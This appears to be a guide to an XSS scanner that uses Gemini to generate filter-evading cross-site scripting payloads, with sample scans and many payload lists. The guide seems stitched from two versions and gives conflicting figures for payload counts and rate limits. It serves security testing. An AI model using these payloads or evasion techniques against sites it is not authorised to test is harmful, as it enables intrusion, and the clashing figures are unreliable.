# 🤖 Gemini 2.0 Flash AI Integration Guide

## Overview

The XSS Scanner now uses **Gemini 2.0 Flash** (free tier) for intelligent, context-aware XSS payload generation. Gemini analyzes the parameter name, injection context, and HTML structure to generate custom payloads designed to bypass filters.

---

## 🚀 Quick Start

### Step 1: Get Gemini API Key (Free)

1. Visit [Google AI Studio](https://makersuite.google.com/app/apikey)
2. Sign in with your Google account
3. Click **"Create API Key"**
4. Copy your API key

### Step 2: Set Environment Variable (Recommended)

**Linux/Mac:**
```bash
export GEMINI_API_KEY="your-api-key-here"
```

**Windows (PowerShell):**
```powershell
$env:GEMINI_API_KEY="your-api-key-here"
```

**Windows (CMD):**
```cmd
set GEMINI_API_KEY=your-api-key-here
```

### Step 3: Install Gemini Library

```bash
pip install google-generativeai
```

Or update all dependencies:
```bash
pip install -r requirements.txt
```

### Step 4: Run Scanner with AI

```bash
python main.py

# When prompted:
🤖 AI-POWERED PAYLOADS (Optional)
❯ Enable Gemini AI? (y/N): y

  Initializing Gemini 2.0 Flash model...
  ✓ Gemini AI enabled successfully!
  ✓ Using model: gemini-2.0-flash-exp
  AI will analyze parameters and generate 5 custom payloads per context
```

---

## 🎯 What's New with Gemini 2.0 Flash

### Enhanced AI Analysis

**The AI now analyzes:**
1. **Parameter Name** - Understanding what the parameter represents (e.g., `search`, `username`, `id`)
2. **Injection Context** - Where the input appears (HTML, attribute, JavaScript, etc.)
3. **HTML Structure** - The actual HTML around the injection point
4. **Response Context** - Broader page context for comprehensive analysis

### Intelligent Payload Generation

**Gemini 2.0 Flash generates:**
- ✅ **5 custom payloads** per context (up from 3)
- ✅ **Context-specific** exploits tailored to the injection point
- ✅ **Filter evasion** techniques (encoding, obfuscation, alternative vectors)
- ✅ **Browser-compatible** payloads that actually work
- ✅ **Creative vectors** beyond traditional patterns

---

## 💡 How It Works

### Example Scan with AI

```bash
$ python main.py

❯ Target URL: https://example.com/search?q=test

🔍 Testing parameter: q
  ⚡ Injecting probe...
  ✓ Reflected in 1 context(s):
    • HTML Text Node
  
  🤖 AI analyzing parameter and generating custom payloads...
  🎯 Testing 12 payloads (7 traditional + 5 AI-generated)

🎯 XSS DISCOVERED → q
  Parameter : q
  Context   : HTML Text Node
  Payload   : <svg/onload=alert(document.domain)>
  🔗 URL: https://example.com/search?q=%3Csvg%2Fonload%3D...
```

### AI Analysis Process

**Step 1: Context Understanding**
```
Parameter: "search"
Context: HTML Text Node
HTML: <div class="results">USER_INPUT</div>
```

**Step 2: AI Reasoning**
```
Gemini analyzes:
- Parameter name suggests user search input
- Reflected in HTML text (not attribute)
- Needs to break out of text context
- Page likely has XSS filters
```

**Step 3: Payload Generation**
```
AI generates 5 payloads:
1. <svg onload=alert(1)>
2. <img src=x onerror=alert(document.domain)>
3. <script>alert`1`</script>
4. <details open ontoggle=alert(1)>
5. <iframe src=javascript:alert(1)>
```

---

## 🎨 Advanced Features

### Context-Specific Analysis

**For Attribute Value (Double Quote):**
```
Parameter: username
Context: Attribute Value (Double Quote)
HTML: <input value="USER_INPUT" name="user">

AI generates:
1. "><script>alert(1)</script>
2. " autofocus onfocus=alert(1) x="
3. "><img src=x onerror=alert(document.domain)>
4. " onload="alert(1)" x="
5. "><svg/onload=alert`1`>
```

**For JavaScript Context:**
```
Parameter: callback
Context: Inside <script> Tag
HTML: <script>var data = 'USER_INPUT';</script>

AI generates:
1. ';alert(1)//
2. </script><script>alert(1)</script><script>
3. '-alert(document.domain)-'
4. ';confirm(1)//
5. \';alert`1`//
```

### Filter Evasion Techniques

Gemini 2.0 Flash uses creative techniques:

**1. Alternative Event Handlers:**
```javascript
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

**2. Case Manipulation:**
```javascript
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

**3. Encoding Variations:**
```javascript
<img src=x onerror=\u0061lert(1)>
<svg/onload=&#97;lert(1)>
```

**4. Protocol Handlers:**
```javascript
<iframe src=javascript:alert(1)>
<a href="data:text/html,<script>alert(1)</script>">
```

---

## 📊 Comparison: Traditional vs AI

### Scan Results

**Without AI (Traditional Payloads Only):**
```
🔍 Testing parameter: search
  ✓ Reflected in 1 context(s): HTML Text Node
  Testing 7 payloads
  ⊗ No working payloads found
```

**With AI (Gemini 2.0 Flash):**
```
🔍 Testing parameter: search
  ✓ Reflected in 1 context(s): HTML Text Node
  🤖 AI analyzing parameter and generating custom payloads...
  🎯 Testing 12 payloads (7 traditional + 5 AI-generated)

🎯 XSS DISCOVERED → search
  Payload: <svg/onload=alert(document.domain)>
```

**Result:** AI found a working payload that traditional patterns missed!

---

## ⚙️ Configuration Options

### Model Settings (in `scanner/payloads.py`)

```python
cls.gemini_model = genai.GenerativeModel(
    'gemini-2.0-flash-exp',  # Free tier model
    generation_config={
        'temperature': 0.9,   # Creativity (0.0-1.0)
        'top_p': 0.95,        # Diversity
        'top_k': 40,          # Token selection
        'max_output_tokens': 1024,  # Response length
    }
)
```

**Adjust for different behaviors:**

**More Creative (higher chance of bypasses):**
```python
'temperature': 1.0,
'top_p': 0.98,
```

**More Conservative (reliable patterns):**
```python
'temperature': 0.7,
'top_p': 0.90,
```

---

## 🔧 Troubleshooting

### Issue: "Failed to initialize Gemini AI"

**Possible causes:**
1. Invalid API key
2. No internet connection
3. API quota exceeded
4. Library not installed

**Solutions:**

**Test API key:**
```bash
python -c "
import google.generativeai as genai
genai.configure(api_key='YOUR_KEY')
model = genai.GenerativeModel('gemini-2.0-flash-exp')
print('✓ API key valid!')
"
```

**Check internet:**
```bash
ping -c 3 generativelanguage.googleapis.com
```

**Install library:**
```bash
pip install --upgrade google-generativeai
```

### Issue: AI payloads not appearing

**Check if AI is enabled:**
```bash
# Look for this message during scan:
🤖 AI analyzing parameter and generating custom payloads...
🎯 Testing 12 payloads (7 traditional + 5 AI-generated)
```

**If not appearing:**
- AI wasn't enabled at startup
- API key invalid
- No internet connection

### Issue: API quota exceeded

**Free tier limits:**
- 60 requests per minute
- 1500 requests per day

**Solution:**
```bash
# Use fewer threads
❯ Threads [default: 5]: 1

# Or disable AI temporarily
❯ Enable Gemini AI? (y/N): n
```

---

## 💰 Cost & Limits

### Free Tier (Gemini 2.0 Flash)

**Rate Limits:**
- 15 RPM (Requests Per Minute)
- 1 million TPM (Tokens Per Minute)
- 1500 RPD (Requests Per Day)

**Perfect for:**
- Individual security researchers
- Bug bounty hunters
- Small-scale testing
- Learning and experimentation

**Cost:** $0 (Free!)

### Optimization Tips

**1. Test fewer parameters:**
```python
# Only test high-value parameters
❯ Parameters: username,search  # Skip low-priority ones
```

**2. Lower thread count:**
```bash
❯ Threads [default: 5]: 2  # Reduces API calls
```

**3. Use traditional first:**
```bash
# First scan without AI
❯ Enable Gemini AI? (y/N): n

# If no vulnerabilities, re-scan with AI
❯ Enable Gemini AI? (y/N): y
```

---

## 🎓 Best Practices

### When to Use AI

**Use AI when:**
- ✅ Testing production applications with strong filters
- ✅ Traditional payloads aren't working
- ✅ You want maximum coverage
- ✅ Target has custom WAF/XSS protection
- ✅ Bug bounty hunting (high-value targets)

**Skip AI when:**
- ❌ Testing known-vulnerable practice labs
- ❌ Quick scans on many targets
- ❌ No internet connection
- ❌ API quota concerns

### Optimal Workflow

**Step 1: Quick Scan (No AI)**
```bash
python main.py
❯ Enable Gemini AI? (y/N): n
# Fast scan with traditional payloads
```

**Step 2: Deep Scan (With AI) - If needed**
```bash
python main.py
❯ Enable Gemini AI? (y/N): y
# Comprehensive scan with AI analysis
```

---

## 📈 Example Results

### Real-World Success

**Target:** E-commerce search function  
**Traditional Result:** No XSS found  
**AI Result:** XSS discovered with `<details open ontoggle=alert(1)>`

**Target:** User profile name field  
**Traditional Result:** Attribute context, no bypass  
**AI Result:** XSS with `"><svg/onload=alert(document.domain)>`

**Target:** JSON API endpoint  
**Traditional Result:** JSON context detected, basic payloads blocked  
**AI Result:** XSS with `\u003cscript\u003ealert(1)\u003c/script\u003e`

---

## 🔐 Security & Privacy

### API Key Safety

**✅ Do:**
- Use environment variables
- Rotate keys regularly
- Use separate keys for different projects

**❌ Don't:**
- Hardcode API keys in scripts
- Share keys publicly
- Commit keys to repositories

### Data Privacy

**What's sent to Gemini:**
- Parameter names
- Injection contexts
- HTML snippets (200-500 characters around injection)

**What's NOT sent:**
- Full page content
- Session tokens
- Sensitive data
- Complete responses

---

## 🆚 Gemini vs Other Models

| Feature | Gemini 2.0 Flash | GPT-4 | Claude |
|---------|------------------|-------|--------|
| **Cost** | Free | Paid | Paid |
| **Speed** | Fast | Medium | Fast |
| **Context** | 1M tokens | 128K | 200K |
| **Creativity** | High | Very High | High |
| **XSS Focus** | ✅ | ⚠️ | ⚠️ |

**Why Gemini 2.0 Flash?**
- ✅ Free tier available
- ✅ Fast response times
- ✅ Good at security analysis
- ✅ Large context window
- ✅ No usage costs

---

## 📚 Additional Resources

**Official Docs:**
- [Gemini API Documentation](https://ai.google.dev/docs)
- [Get API Key](https://makersuite.google.com/app/apikey)
- [Rate Limits](https://ai.google.dev/pricing)

**XSS Resources:**
- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)

---

**Ready to supercharge your XSS hunting with AI? Get your free API key and start scanning! 🚀**

---

## 🚀 Quick Start

### Step 1: Get Gemini API Key

1. Visit [Google AI Studio](https://makersuite.google.com/app/apikey)
2. Sign in with your Google account
3. Click **"Get API Key"** or **"Create API Key"**
4. Copy your API key

### Step 2: Set Environment Variable (Recommended)

**Linux/Mac:**
```bash
export GEMINI_API_KEY="your-api-key-here"
```

**Windows (PowerShell):**
```powershell
$env:GEMINI_API_KEY="your-api-key-here"
```

**Windows (CMD):**
```cmd
set GEMINI_API_KEY=your-api-key-here
```

### Step 3: Install Dependencies

```bash
pip install google-generativeai
```

Or update all dependencies:
```bash
pip install -r requirements.txt
```

### Step 4: Run Scanner

```bash
python main.py
```

When prompted:
```
🤖 GEMINI AI CONFIGURATION (Optional)
❯ Enable Gemini AI? (y/N): y
```

---

## 🎯 How It Works

### Traditional Payloads (Without AI)
```python
# Scanner generates fixed payloads per context
Context: HTML Text Node
Payloads:
- <script>alert(1)</script>
- <img src=x onerror=alert(1)>
- <svg onload=alert(1)>
```

### AI-Enhanced Payloads (With Gemini)
```python
# Gemini analyzes the actual injection point
Context: HTML Text Node
HTML Snippet: <div class="search">USER_INPUT</div>

Gemini generates custom payloads:
- </div><script>alert(document.domain)</script><div>
- <img src=x onerror="alert('XSS')">
- <svg/onload=alert`1`>
```

**Benefits:**
- Context-aware based on actual HTML structure
- More creative bypass techniques
- Adapts to visible filters in the response

---

## 💡 Usage Modes

### Mode 1: Custom URL Input (NEW!)

```bash
python main.py

📋 SCAN MODE SELECTION
  [0] Enter custom URL
  [1] Google XSS Game - Level 1
  ...

❯ Select option [0-5]: 0

🌐 CUSTOM URL SCANNER
❯ Target URL: https://example.com/search?q=test&category=all

# Scanner automatically:
# - Extracts parameters (q, category)
# - Tests each parameter for XSS
# - Generates context-aware payloads
```

### Mode 2: Pre-configured Targets

```bash
❯ Select option [0-5]: 1

# Uses targets from targets/examples.py
```

---

## 📁 Report Naming Convention

Reports are now auto-named with timestamp and domain:

**Format:**
```
xss-report_YYYY-MM-DD_HH-MM-SS_{sanitized-domain}.html
```

**Examples:**
```
xss-report_2024-01-15_14-30-45_example.com.html
xss-report_2024-01-15_14-32-10_testphp.vulnweb.com.html
xss-report_2024-01-15_14-35-22_xss-game.appspot.com.html
```

**Benefits:**
- Easy to identify which target was scanned
- Chronological ordering by timestamp
- No filename conflicts

---

## 🔧 Advanced Configuration

### Customize AI Prompts

Edit `scanner/payloads.py`:

```python
@classmethod
def generate_ai_payloads(cls, context: InjectionContext, html_snippet: str = "") -> List[str]:
    prompt = f"""Generate XSS payloads for:
    
    Context: {context.value}
    HTML: {html_snippet}
    
    Requirements:
    - Must work in Chrome/Firefox
    - Bypass common WAF filters
    - Use creative encoding
    
    Provide 5 payloads:"""
    
    # ... rest of code
```

### Disable AI After Initialization

```python
# In main.py or your script
from scanner.payloads import PayloadGenerator

PayloadGenerator.gemini_enabled = False  # Disable AI
```

### Check AI Status

```python
if PayloadGenerator.gemini_enabled:
    print("AI payloads are active")
else:
    print("Using traditional payloads only")
```

---

## 🎓 Example Workflow

### Complete Scan Example

```bash
$ python main.py

╔═══════════════════════════════════════════════════════════════════════════╗
║     ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗     ║
║     ... XSS SCANNER v2.0 ...
╚═══════════════════════════════════════════════════════════════════════════╝

🤖 GEMINI AI CONFIGURATION (Optional)
❯ Enable Gemini AI? (y/N): y

  ✓ Gemini AI enabled successfully!

📋 SCAN MODE SELECTION
  [0] Enter custom URL
  [1] Google XSS Game - Level 1

❯ Select option [0-5]: 0

🌐 CUSTOM URL SCANNER
❯ Target URL: http://testsite.com/search?q=test&filter=all

  ✓ Base URL: http://testsite.com/search
  ✓ Found 2 parameter(s): q, filter

⚙️  SCAN CONFIGURATION
  Target    : Custom URL Scan
  URL       : http://testsite.com/search
  Method    : GET
  Parameters: q, filter
  Threads   : 10

🚀 STARTING SCAN
Press ENTER to begin...

─────────────────────────────────────────────────────────────────────────────
🔍 Testing parameter: q
  ⚡ Injecting probe...
  ✓ Reflected in 1 context(s):
    • HTML Text Node

🎯 XSS DISCOVERED → q
  Parameter : q
  Context   : HTML Text Node
  Payload   : <script>alert(1)</script>
  🔗 URL: http://testsite.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

📊 GENERATING REPORT

✨ SCAN COMPLETED
  Report saved: reports/xss-report_2024-01-15_14-30-45_testsite.com.html
  Vulnerabilities found: 1
```

---

## 🛡️ Security Best Practices

### 1. Protect Your API Key

**Never hardcode API keys:**
```python
# ❌ BAD
api_key = "AIzaSyC1234567890abcdefghijklmnop"

# ✅ GOOD
api_key = os.getenv('GEMINI_API_KEY')
```

### 2. Use Environment Variables

Create a `.env` file (add to .gitignore):
```bash
GEMINI_API_KEY=your-key-here
```

Load in your script:
```python
from dotenv import load_dotenv
load_dotenv()
```

### 3. API Rate Limits

Gemini has usage limits:
- Free tier: 60 requests per minute
- The scanner limits to 3 AI payloads per context
- Traditional payloads are always tested first

---

## 🐛 Troubleshooting

### Issue: "Failed to initialize Gemini AI"

**Possible causes:**
1. Invalid API key
2. No internet connection
3. Gemini service unavailable

**Solutions:**
```bash
# Verify API key
echo $GEMINI_API_KEY

# Test API key
python -c "import google.generativeai as genai; genai.configure(api_key='YOUR_KEY'); print('OK')"

# Continue without AI
# Press N when asked to enable Gemini
```

### Issue: "ModuleNotFoundError: No module named 'google.generativeai'"

**Solution:**
```bash
pip install google-generativeai
```

### Issue: AI payloads not appearing

**Check:**
1. Gemini was enabled at startup
2. Context was detected correctly
3. API key is valid

**Debug:**
```python
# Add to scanner/payloads.py after generate_ai_payloads()
print(f"AI payloads generated: {len(ai_payloads)}")
```

---

## 📊 Comparing Results

### Test Same Target With/Without AI

**Without AI:**
```bash
python main.py
❯ Enable Gemini AI? (y/N): n

Results: 3 vulnerabilities found
Payloads tested: 7 per context
```

**With AI:**
```bash
python main.py
❯ Enable Gemini AI? (y/N): y

Results: 5 vulnerabilities found
Payloads tested: 10 per context (7 traditional + 3 AI)
```

AI often finds bypasses that traditional payloads miss!

---

## 🎯 Best Practices

### When to Use AI

**Use AI when:**
- Testing complex applications with custom filters
- Traditional payloads aren't working
- You want maximum coverage
- Testing high-value targets

**Skip AI when:**
- Scanning many targets quickly (rate limits)
- Testing simple/known vulnerable apps
- No internet connection
- API costs are a concern

### Optimal Configuration

```python
# targets/examples.py
{
    'name': 'Production App',
    'url': 'https://app.example.com/search',
    'method': 'GET',
    'params': {
        'q': '',
        'filter': '',
        'category': ''
    },
    'threads': 5  # Lower for API rate limits with AI
}
```

---

## 📈 Future Enhancements

Planned features:
- [ ] GPT-4 integration option
- [ ] Custom AI model selection
- [ ] Payload mutation based on response
- [ ] Learning from successful payloads
- [ ] AI-powered WAF detection

---

## 💡 Tips

1. **Start without AI** to understand baseline results
2. **Enable AI** for stubborn targets
3. **Monitor API usage** in Google AI Studio
4. **Save successful payloads** for future use
5. **Compare reports** with/without AI

---

## 🤝 Contributing

Have ideas for AI improvements?

1. Fork the repository
2. Modify `scanner/payloads.py`
3. Test thoroughly
4. Submit pull request

---

**Ready to supercharge your XSS hunting with AI? Get your API key and start scanning! 🚀**
